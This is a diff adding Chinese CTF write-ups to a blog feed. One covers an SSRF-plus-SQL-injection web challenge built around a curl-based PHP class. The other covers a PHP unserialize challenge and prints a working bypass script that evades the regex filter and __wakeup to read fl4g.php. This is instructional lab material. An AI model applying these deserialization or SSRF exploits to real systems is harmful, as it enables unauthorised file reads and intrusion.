@@ -652,8 +652,85 @@
 </ol>
 </li>
 <li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><ol>
-<li>一个破网站，暴力破解试了试没用，只能乖乖的注册一个账号。</li>
+<li><p>一个破网站，暴力破解试了试没用，只能乖乖的注册一个账号。</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.1.png?raw=true"></p>
+<p>然后扫描器扫出了一些奇怪的东西</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>get函数中存在curl函数的使用，猜测可能是ssrf漏洞，能通过构造特定的网页请求对内网进行操作，后边getBlogContents函数能读取输入的blog，如果blog能构造出file:// + 目录便可以查看flag，然而在下面却对blog有严格的过滤，只能放弃了……</p>
+</li>
+<li><p>进入注册用户的主界面，观察url中有get请求，推测可能存在注入</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.2.png?raw=true"></p>
+<p>试一下</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.3.png?raw=true"></p>
+<p>好像可以，接着来</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.4.png?raw=true"></p>
+<p>然鹅好像有过滤</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.5.png?raw=true"></p>
+<p>尝试内联注释绕过</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.6.png?raw=true"></p>
+<p>成功绕过，同时发现username显示的是注入的第二列的内容（注入点大概在这了）</p>
+<p>爆表名</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.7.png?raw=true"></p>
+<p>爆列名</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.8.png?raw=true"></p>
+<p>查看内容</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.9.png?raw=true"></p>
+</li>
+<li><p>啊这……爆出来一个不知道什么玩意，猜测可能这里面存的是输入的内容传输的过程（明显的序列化字符串），如果是这样的话，说明对blog的验证只在后端有，所以说，如果我们能构造一下blog在传输过程中的样式，就可以进行对内网的操作了。</p>
+<p>先构造序列化字符串</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.10.png?raw=true"></p>
+<p>注入</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.11.png?raw=true"></p>
+</li>
 </ol>
+</li>
+</ul>
+<pre><code> 得到flag。</code></pre>
+<ul>
+<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><p><strong>01SSRF概念</strong></p>
+<p>服务端请求伪造(Server-Side Request Forgery),指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>
+<p><strong>02SSRF的原理</strong></p>
+<p>很多web应用都提供了从其他的服务器上获取数据的功能。使用指定的URL，web应用便可以获取图片，下载文件，读取文件内容等。SSRF的实质是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。一般情况下， SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>
+<p><strong>03SSRF的主要攻击方式</strong></p>
+<p>攻击者想要访问主机B上的服务，但是由于存在防火墙或者主机B是属于内网主机等原因导致攻击者无法直接访问主机B。而服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，从而获取主机B的一些信息</p>
+<p><strong>04SSRF的危害</strong></p>
+<p>1.内外网的端口和服务扫描</p>
+<p>2.攻击运行在内网或本地的应用程序</p>
+<p>3.对内网web应用进行指纹识别，识别企业内部的资产信息</p>
+<p>4.攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）</p>
+<h5 id="5-利用file协议读取本地敏感数据文件等（这次就用了file协议）"><a href="#5-利用file协议读取本地敏感数据文件等（这次就用了file协议）" class="headerlink" title="5.利用file协议读取本地敏感数据文件等（这次就用了file协议）"></a>5.利用file协议读取本地敏感数据文件等（这次就用了file协议）</h5><p>来自<a href="https://www.freebuf.com/">FreeBuf.COM</a></p>
+</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>web-9 攻防世界 Web_php_unserialize</title>
+    <url>/2020/12/28/web-9/</url>
+    <content><![CDATA[<h1 id="攻防世界-Web-php-unserialize"><a href="#攻防世界-Web-php-unserialize" class="headerlink" title="攻防世界 Web_php_unserialize"></a>攻防世界 Web_php_unserialize</h1><ul>
+<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
+<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
+<li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
+</ul>
+<a id="more"></a>
+
+<ul>
+<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3></li>
+</ul>
+<p>​       没什么可说的，简单的PHP反序列化漏洞，存在两个过滤需要绕过。</p>
+<ul>
+<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>源码泄露，开局一串PHP代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>显然是一个反序列化漏洞，存在两个过滤需要绕过：</p>
+<ol>
+<li>正则表达式过滤了形如：(o~c):(数字)这种样式的字符串，但是我们可以在数字前面加一个+就能绕过。</li>
+<li>类中调用了_wakeup函数，将file变量指向了index.php，但当传入的字符串经反序列化后的变量数量比类中原来的要多，则自动跳过wakeip函数。</li>
+</ol>
+<p>由此可以写一个绕过的脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Demo();</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$s</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$s</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$var</span> = base64_encode(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后得到flag</p>
 </li>
 </ul>
 ]]></content>
